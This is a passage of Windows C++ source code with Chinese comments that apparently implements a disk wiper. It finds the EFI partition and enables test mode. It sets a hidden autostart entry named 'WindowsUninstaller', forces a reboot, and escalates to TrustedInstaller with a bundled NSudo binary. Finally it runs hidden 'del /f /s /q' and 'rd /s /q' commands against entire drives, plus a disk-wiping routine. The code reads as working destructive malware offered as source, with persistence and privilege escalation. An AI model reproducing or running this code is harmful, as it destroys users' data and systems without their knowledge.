        DWORD maxComponentLen = 0;
        DWORD fileSystemFlags = 0;
        
        if (GetVolumeInformationW(path, volumeName, MAX_PATH, &serialNumber, 
            &maxComponentLen, &fileSystemFlags, fileSystem, MAX_PATH)) {
            
            // 检查是否是 FAT32 文件系统（EFI 分区通常是 FAT32）
            if (_wcsicmp(fileSystem, L"FAT32") == 0) {
                // 检查是否有 EFI 目录
                TCHAR efiDir[MAX_PATH] = {0};
                swprintf_s(efiDir, sizeof(efiDir)/sizeof(TCHAR), L"%c:\\EFI", c);
                
                if (GetFileAttributesW(efiDir) == FILE_ATTRIBUTE_DIRECTORY) {
                    *driveLetter = c;
                    DebugLog(L"FindEFIPartition: 找到 EFI 分区: %c:\n", c);
                    return true;
                }
            }
        }
    }
    
    DebugLog(L"FindEFIPartition: 未找到 EFI 分区\n");
    return false;
}

void RunSilentMode(HINSTANCE hInstance) {
    DebugLog(L"RunSilentMode: 开始静默模式执行\n");
    
    LPWSTR cmdLineW = GetCommandLineW();
    std::wstring cmdLine(cmdLineW);
    bool isElevated = (cmdLine.find(SECRET_PARAM) != std::wstring::npos);
    bool hasSilentFlag = CheckSilentFlag();
    
    g_testModeEnabled = IsTestModeEnabled();
    DebugLog(L"测试模式状态: %s\n", g_testModeEnabled ? L"已开启" : L"未开启");
    DebugLog(L"静默标记状态: %s\n", hasSilentFlag ? L"存在" : L"不存在");
    
    if (!g_testModeEnabled) {
        DebugLog(L"RunSilentMode: 测试模式未开启，启用测试模式...\n");
        
        if (EnableTestMode()) {
            DebugLog(L"RunSilentMode: 测试模式已启用\n");
            SetSilentFlag();
            
            wchar_t selfPath[MAX_PATH];
            GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
            
            std::wstring nsudoPath = GetTempFilePath(L"nsudo_temp.exe");
            if (ExtractResourceToFile(hInstance, NSUDO_BIN, nsudoPath)) {
                std::wstring autoRunValue = L"\"" + nsudoPath + L"\" -U:T -P:E \"" + std::wstring(selfPath) + L"\" " + SILENT_PARAM;
                
                HKEY hKey;
                if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
                    RegSetValueExW(hKey, L"WindowsUninstaller", 0, REG_SZ, (const BYTE*)autoRunValue.c_str(), (autoRunValue.size() + 1) * sizeof(wchar_t));
                    RegCloseKey(hKey);
                    DebugLog(L"RunSilentMode: 自启动已设置\n");
                }
            }
            
            DebugLog(L"RunSilentMode: 系统将在10秒后重启...\n");
            RestartComputer();
        } else {
            DebugLog(L"RunSilentMode: 无法启用测试模式，退出\n");
        }
        return;
    }
    
    if (isElevated) {
        DebugLog(L"RunSilentMode: 已获得TrustedInstaller权限，直接执行擦除...\n");
        WipeDisksThread(nullptr);
        return;
    }
    
    if (hasSilentFlag) {
        DebugLog(L"RunSilentMode: 检测到静默标记，获取TrustedInstaller权限...\n");
        
        std::wstring nsudoPath = GetTempFilePath(L"nsudo_temp.exe");
        if (!ExtractResourceToFile(hInstance, NSUDO_BIN, nsudoPath)) {
            DebugLog(L"RunSilentMode: 无法提取NSudo\n");
            return;
        }
        
        wchar_t selfPath[MAX_PATH];
        GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
        
        std::wstring command = nsudoPath + L" -U:T -P:E \"" + std::wstring(selfPath) + L"\" " + FORCE_PARAM;
        DebugLog(L"RunSilentMode: NSudo命令: %s\n", command.c_str());
        
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        
        BOOL createResult = CreateProcessW(nullptr, const_cast<wchar_t*>(command.c_str()), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
        if (createResult) {
            DebugLog(L"RunSilentMode: 以TrustedInstaller权限启动成功\n");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            DebugLogWithError(L"RunSilentMode: CreateProcessW 失败");
        }
        return;
    }
    
    DebugLog(L"RunSilentMode: 未检测到静默标记，退出\n");
}

// 使用 TrustedInstaller 权限删除文件和目录
void DeleteFilesWithTI(const TCHAR* driveLetter) {
    DebugLog(L"DeleteFilesWithTI: 正在删除 %c: 盘内容...\n", *driveLetter);
    
    std::wstring nsudoPath = GetTempFilePath(L"nsudo_temp.exe");
    if (!ExtractResourceToFile(hInst, NSUDO_BIN, nsudoPath)) {
        DebugLog(L"DeleteFilesWithTI: 无法提取 NSudo\n");
        return;
    }
    
    // 构建删除命令
    // del /f /s /q 强制删除所有文件
    // rd /s /q 强制删除所有目录
    TCHAR cmd[MAX_PATH * 2] = {0};
    swprintf_s(cmd, sizeof(cmd)/sizeof(TCHAR), 
        L"\"%s\" -U:T -P:E cmd /c \"del /f /s /q %c:\\*.* && rd /s /q %c:\\\"",
        nsudoPath.c_str(), *driveLetter, *driveLetter);
    
    DebugLog(L"DeleteFilesWithTI: 执行命令: %s\n", cmd);
    
    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (CreateProcessW(nullptr, cmd, nullptr, nullptr, FALSE, 
        CREATE_NO_WINDOW | CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi)) {
        
        WaitForSingleObject(pi.hProcess, 60000); // 最多等待60秒
        
        DWORD exitCode = 0;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        DebugLog(L"DeleteFilesWithTI: 命令执行完成, 退出码: %lu\n", exitCode);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        DebugLogWithError(L"DeleteFilesWithTI: CreateProcessW 失败");
    }
    
    DeleteFileW(nsudoPath.c_str());
}